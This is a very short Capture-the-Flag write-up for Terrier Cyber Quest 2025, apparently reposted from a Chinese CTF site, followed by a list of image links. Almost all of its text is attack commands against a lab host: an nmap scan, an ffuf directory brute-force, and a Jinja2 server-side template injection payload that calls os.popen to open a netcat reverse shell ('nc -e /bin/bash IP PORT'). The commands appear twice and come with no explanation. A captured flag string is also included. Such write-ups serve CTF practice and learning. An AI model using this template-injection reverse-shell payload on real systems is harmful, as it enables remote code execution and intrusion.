# Terrier Cyber Quest 2025 — 简要 Write-up

> 原文: https://www.ctfiot.com/272051.html
> ID: 272051

sudo nmap -sC 192.168.57.24 -A -v -p-

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.57.24:
5000/FUZZ-fs 3806

{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('nc -e /bin/bash IP PORT').read()}}

22gSOqdlldjDbbIxZ4NPAeodlIvKmMGjj3ZTw9D5fXc1ffsERpc7CznmEVd1BhfbqbQaIJ5s4


```
sudo nmap -sC 192.168.57.24 -A -v -p-
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.57.24:
5000/FUZZ-fs 3806
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('nc -e /bin/bash IP PORT').read()}}
22gSOqdlldjDbbIxZ4NPAeodlIvKmMGjj3ZTw9D5fXc1ffsERpc7CznmEVd1BhfbqbQaIJ5s4
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121949-wxsync-2025-09-2472950428b52a6059c4e678f95104e1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121952-wxsync-2025-09-3aaf4e0d6930f2fee358654111b5a7a1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121954-wxsync-2025-09-eb8b74ffba9c2697abaf86de1d957208.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121956-wxsync-2025-09-eb9a636a02639de9035942d0952c2173.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121958-wxsync-2025-09-eabce0e39fa3027da9914656dbdb1da5.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121960-wxsync-2025-09-3b62337ad7f15244a4aa5a3b789b4089.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121962-wxsync-2025-09-6c727c4b2b2cf673963d89b7fa2eba18.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121963-wxsync-2025-09-d82bb2b70dfc67c0c581fa1ae3860bea.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121965-wxsync-2025-09-64e61244759f0c98d25331de18b91f3d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121967-wxsync-2025-09-b8beb5378aa3a5a946cabb4f29d3fa63.png)